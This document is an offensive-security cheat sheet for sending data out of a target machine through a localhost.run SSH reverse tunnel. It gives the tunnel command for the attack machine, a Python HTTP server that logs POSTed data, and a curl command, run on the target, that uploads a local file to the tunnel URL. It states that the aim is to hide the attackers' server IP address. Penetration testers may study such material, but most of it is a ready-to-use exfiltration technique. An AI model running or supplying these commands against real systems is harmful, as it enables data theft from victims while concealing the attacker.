# Send Data via Localhost.run

## 1. Start SSH Port Forwarding

In attack machine, run the following command:

```sh
# Optional: If you have not already created SSH keys.
ssh-keygen

ssh -R 80:localhost:8080 nokey@localhost.run
```

After that, the endpoint URL (`https://xxxxxxxxxx.lhr.life`) is displayed in the terminal.

## 2. Start HTTP Server

We need to prepare a custom HTTP server because a default server does not allow the POST method. So create a new Python file:

```py
# server.py
from http.server import HTTPServer
from http.server import BaseHTTPRequestHandler


class CustomHTTPRequestHandler(BaseHTTPRequestHandler):

    def do_GET(self):
        self.send_response(200)
        self.send_header('Content-type', "text/html")
        self.end_headers()
        html_context = '<html lang="ja">' \
                       '<meta charset="UTF-8"><form method="POST" action="/">' \
                       '<input type="hidden" name="word" value="abcde">' \
                       '<input type="submit" value="送信">' \
                       '</form>' \
                       '</html>'
        self.wfile.write(html_context.encode())

    def do_POST(self):
        self.send_response(200)
        self.send_header('Content-Type', 'text/plain; charset=utf-8')
        self.end_headers()
        print(self.rfile.read(int(self.headers['content-length'])).decode('utf-8'))
        html_context = "送信完了"
        self.wfile.write(html_context.encode())


server_address = ('localhost', 8080)
httpd = HTTPServer(server_address, CustomHTTPRequestHandler)
httpd.serve_forever()
```

Now start the server:

```sh
python3 server.py
```

The `http://localhost:8080` opens for receiving requests.


## 2. Send Data to the Endpoint

In target machine, run the following command to send data:

```powershell
curl -F "@=./data.txt" https://xxxxxxxxxx.lhr.life
```

By this, we (attackers) can anonymize our actual server IP addresses.